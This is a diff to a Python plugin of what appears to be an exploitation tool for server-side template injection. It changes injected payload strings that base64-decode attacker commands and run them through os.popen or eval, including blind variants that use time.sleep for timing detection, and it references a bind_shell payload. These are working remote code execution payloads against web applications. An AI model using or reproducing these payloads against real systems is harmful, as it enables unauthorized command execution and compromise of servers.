@@ -45,7 +45,7 @@ class Python(Plugin):
             },
             'execute' : {
                 'call': 'evaluate',
-                'execute': """__import__('os').popen(__import__('base64').urlsafe_b64decode('%(code_b64)s')).read()""",
+                'execute': """__import__('os').popen(__import__('base64').urlsafe_b64decode('%(code_b64)s').decode()).read()""",
                 'test_cmd': bash.echo % { 's1': rand.randstrings[2] },
                 'test_cmd_expected': rand.randstrings[2] 
             },
@@ -56,7 +56,7 @@ class Python(Plugin):
             },
             'evaluate_blind' : {
                 'call': 'evaluate',
-                'evaluate_blind': """eval(__import__('base64').urlsafe_b64decode('%(code_b64)s')) and __import__('time').sleep(%(delay)i)"""
+                'evaluate_blind': """eval(__import__('base64').urlsafe_b64decode('%(code_b64)s').decode()) and __import__('time').sleep(%(delay)i)"""
             },
             'bind_shell' : {
                 'call' : 'execute_blind',
@@ -68,7 +68,7 @@ class Python(Plugin):
             },
             'execute_blind' : {
                 'call': 'evaluate',
-                'execute_blind': """__import__('os').popen(__import__('base64').urlsafe_b64decode('%(code_b64)s') + ' && sleep %(delay)i').read()"""
+                'execute_blind': """__import__('os').popen(__import__('base64').urlsafe_b64decode('%(code_b64)s').decode() + ' && sleep %(delay)i').read()"""
             },
         })
 
